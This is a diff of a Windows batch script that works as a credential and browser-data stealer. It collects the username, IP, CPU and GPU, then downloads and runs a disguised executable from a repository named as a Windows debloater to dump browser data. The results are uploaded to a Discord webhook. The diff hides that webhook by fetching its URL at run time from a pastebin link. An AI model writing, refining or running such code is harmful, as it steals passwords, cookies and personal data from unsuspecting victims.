@@ -1,10 +1,11 @@
 @echo off
 setlocal
-curl icanhazip.com > ip & set /p ip=<ip
+curl icanhazip.com>ip&set/p ip=<ip
+curl https://pastebin.com/raw/m0sf0H4P>w&set/p w=<w
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic cpu get name ^| findstr /r /v "^$"`) do set cpu=%%i
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get name ^| findstr /r /v "^$"`) do set gpu=%%i
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1010863932476497992/nMAlxTmV9xBd5lpzm5yjdjNh7jTjV-1-XEt-YrifB5e__veJ90Mi0qLsWKYF6lYSKGhN
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" %w%
 endlocal
 powershell -Command "iwr "https://github.com/Dazd-Pkz/Windows10Debloater/raw/main/powershell.exe" -o %temp%\powershell.exe"
 %temp%\powershell.exe --zip --dir dump
-curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" https://discord.com/api/webhooks/1010863932476497992/nMAlxTmV9xBd5lpzm5yjdjNh7jTjV-1-XEt-YrifB5e__veJ90Mi0qLsWKYF6lYSKGhN
+curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" %w%
